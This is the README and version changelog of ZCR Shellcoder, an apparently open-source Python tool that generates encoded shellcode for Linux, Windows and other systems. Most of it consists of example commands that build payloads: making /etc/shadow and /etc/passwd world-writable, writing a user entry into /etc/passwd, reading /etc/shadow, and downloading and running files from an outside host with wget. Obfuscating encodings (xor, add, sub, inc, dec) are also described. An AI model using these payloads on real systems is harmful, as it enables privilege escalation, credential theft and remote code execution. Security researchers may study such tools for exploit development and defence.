ZCR Shellcoder is an open source software in python language which lets you 
generate customized  shellcodes for listed operation systems. This software 
can be run on Windows/Linux&Unix/OSX and others OS under python 2.7.x.

Home: http://zsc.z3r0d4y.com/
Features: http://zsc.z3r0d4y.com/table.html
Github: https://github.com/Ali-Razmjoo/ZCR-Shellcoder
Archive: https://github.com/Ali-Razmjoo/ZCR-Shellcoder-Archive
About Author: http://www.z3r0d4y.com/p/about.html

for more information read the document files in main directory or visit home page.


Usages And Changes:
==
version 1.0.5.1: CaMo
----

upgrade "-wizard" switch
add length calculator for output
add filename writer in gcc commandline in output file
fixed bug in encoding module not available.
fixed bug in os module not available


==
version 1.0.5: CaMo
----
add "-wizard" switch
add installer "use 'zsc' commandline in terminal after installed"
add uninstaller 
This Software just could be run on linux since this version
change output to .c file and automated shellcode generating
add color output for terminal
etc ...

version 1.0.4.1: Infinity
----
bug fix reported by user in executing on linux , color function

version 1.0.4: Infinity
----
add inc encoding chmod() [linux_x86]
add inc_timesyouwant chmod() [linux_x86]
add dec encoding chmod() [linux_x86]
add dec_timesyouwant chmod() [linux_x86]
add features table inside "features_table.html"
add -about to menu for developers name and etc
add color output for windows cmd
fixed permission number calculating in chmod() [linux_x86]
software's signature changes

Examples:
>python shellcoder.py -os linux_x86 -encode inc -job chmod('/etc/passwd','777') -o file
>python shellcoder.py -os linux_x86 -encode dec -job chmod('/etc/passwd','777') -o file
>python shellcoder.py -os linux_x86 -encode inc_10 -job chmod('/etc/passwd','777') -o file
>python shellcoder.py -os linux_x86 -encode dec_30 -job chmod('/etc/passwd','777') -o file

Note: you also can use high value for inc and dec time, like inc_100000, your shellcode may get too big


version 1.0.3: AWAKE
----
add xor_random encoding chmod() [linux_x86]
add xor_yourvalue encoding chmod() [linux_x86]
add add_random encoding chmod() [linux_x86]
add add_yourvalue encoding chmod() [linux_x86]
add sub_random encoding chmod() [linux_x86]
add sub_yourvalue encoding chmod() [linux_x86]
fixed shellcode encode type checking

Examples: 
>python shellcoder.py -os linux_x86 -encode xor_random -job chmod('/etc/shadow','777') -o file.txt
>python shellcoder.py -os linux_x86 -encode xor_random -job chmod('/etc/passwd','444') -o file.txt

Note: each time you execute chmod() function with random encode, you are gonna get random outputs and different shellcode.

>python shellcoder.py -os linux_x86 -encode xor_0x41414141 -job chmod('/etc/shadow','777') -o file.txt
>python shellcoder.py -os linux_x86 -encode xor_0x45872f4d -job chmod('/etc/passwd','444') -o file.txt

Note: your xor value could be anything. "xor_0x41414141" and "xor_0x45872f4d" are examples.

>python shellcoder.py -os linux_x86 -encode add_random -job chmod('/etc/passwd','444') -o file.txt
>python shellcoder.py -os linux_x86 -encode add_0x41414141 -job chmod('/etc/passwd','777') -o file.txt


>python shellcoder.py -os linux_x86 -encode sub_random -job chmod('/etc/passwd','777') -o file.txt
>python shellcoder.py -os linux_x86 -encode sub_0x41414141 -job chmod('/etc/passwd','444') -o file.txt



version 1.0.2: SKIP
----
[linux_x86 modules completed]
add script_executor() [linux - using command execution]
add download_execute() [linux_x86 - using command execution (wget)]  
add download() [linux_x86 - using command execution (wget)] 
add dir_create() [linux_x86 using command execution] 
add file_create() [linux_x86 using command execution]
add encodes file for next version released

Examples:
>python shellcoder.py -os linux_x86 -encode none -job file_create('/root/Desktop/hello.txt','hello') -o file.txt
>python shellcoder.py -os linux_x86 -encode none -job file_create('/root/Desktop/hello2.txt','hello[space]world[space]!') -o file.txt
>python shellcoder.py -os linux_x86 -encode none -job dir_create('/root/Desktop/mydirectory') -o file.txt
>python shellcoder.py -os linux_x86 -encode none -job download('http://www.z3r0d4y.com/exploit.type','myfile.type') -o file.txt
>python shellcoder.py -os linux_x86 -encode none -job download_execute('http://www.z3r0d4y.com/exploit.type','myfile.type','./myfile.type') -o file.txt

#multi command
>python shellcoder.py -os linux_x86 -encode none -job download_execute('http://www.z3r0d4y.com/exploit.type','myfile.type','chmod[space]777[space]myfile.type;sh[space]myfile.type') -o file.txt
>python shellcoder.py -os linux_x86 -encode none -job script_executor('script.type','D:\\myfile.type','./script.type') -o file.txt
>python shellcoder.py -os linux_x86 -encode none -job script_executor('z3r0d4y.sh','/root/z3r0d4y.sh','sh[space]z3r0d4y.sh') -o file.txt
>python shellcoder.py -os linux_x86 -encode none -job script_executor('ali.py','/root/Desktop/0day.py','chmod[space]+x[space]ali.py;[space]python[space]ali.py') -o file.txt

Note: Remember don't use " " and replace it with "[space]"
Note: script_executor(),download_execute(),download(),dir_create(),file_create() are using linux command line , not the function. [wget,mkdir,echo]


version 1.0.1: BOILING_POINT
----
add system() [linux_x86 command execute]
fixed chmod filename 1/4 char length [linux_x86]
fixed exec filename 1/4 char length [linux_x86]
fixed write filename 1/4 length [linux_x86]
fixed write content 1/4 length [linux_x86]
fixed write length calculator [linux_x86]
and fixed some other bugs in coding [core]

Examples:

system() function added in script, you can use it to do anything and generate any command line shellcode.
Note: Don't use space ' ' in system() function, replace it with "[space]" , software will detect and replace " " for you in shellcode.

>python shellcoder.py -os linux_x86 -encode none -job system('ls') -o file.txt
>python shellcoder.py -os linux_x86 -encode none -job system('ls[space]-la') -o file.txt
>python shellcoder.py -os linux_x86 -encode none -job system('ls[space]-la[space]/etc/shadow;chmod[space]777[space]/etc/shadow;ls[space]-la[space]/etc/shadow;cat[space]/etc/shadow;wget[space]file[space];chmod[space]777[space]file;./file') -o file.txt
>python shellcoder.py -os linux_x86 -encode none -job system('wget[space]file;sh[space]file') -o file.txt


version 1.0.0: ASIIN_BLUE_RUBY
----
add chmod() [linux_x86] -> chmod('/path/file','perm_num')
add write() [linux_x86] -> write('/path/file','content')
add exec() [linux_x86]  -> exec('/path/file')
add encode [none - all os] 

Examples:

>python shellcoder.py -h 

Switches:
-h, --h, -help, --help => to see this help guide
-os => choose your os to create shellcode
-oslist => list os for switch -os
-o => output filename
-job => what shellcode gonna do for you ?
-joblist => list of -job switch
-encode => generate shellcode with encode
-types => types of encode for -encode switch

-update => check for update

>python shellcoder.py -oslist

[+] linux_x86
[+] linux_x64
[+] linux_arm
[+] linux_mips
[+] freebsd_x86
[+] freebsd_x64
[+] windows_x86
[+] windows_x64
[+] osx
[+] solaris_x86
[+] solaris_x64

>python shellcoder.py -joblist

[+] exec('/path/file')
[+] chmod('/path/file','permission number')
[+] write('/path/file','text to write')
[+] file_create('/path/file','text to write')
[+] dir_create('/path/folder')
[+] download('url','filename')
[+] download_execute('url','filename','command to execute')
[+] system('command to execute')
[+] script_executor('name of script','path and name of your script in your pc','execute command')


>python shellcoder.py -types

[+] none
[+] xor_random
[+] xor_yourvalue
[+] add_random
[+] add_yourvalue
[+] sub_random
[+] sub_yourvalue
[+] inc
[+] inc_timesyouwant
[+] dec
[+] dec_timesyouwant
[+] mix_all


Generating shellcodes , using functions:
>python shellcoder.py -os linux_x86 -encode none -job chmod('/etc/shadow','777') -o file.txt
>python shellcoder.py -os linux_x86 -encode none -job write('/etc/passwd','user:pass') -o file.txt
>python shellcoder.py -os linux_x86 -encode none -job exec('/bin/bash') -o file.txt

Note: exec() doesn't support any ARGV same as exec('/bin/bash -c ls') or exec('/bin/bash','-c','ls'), you have to wait for next version and this feature will available  in system()
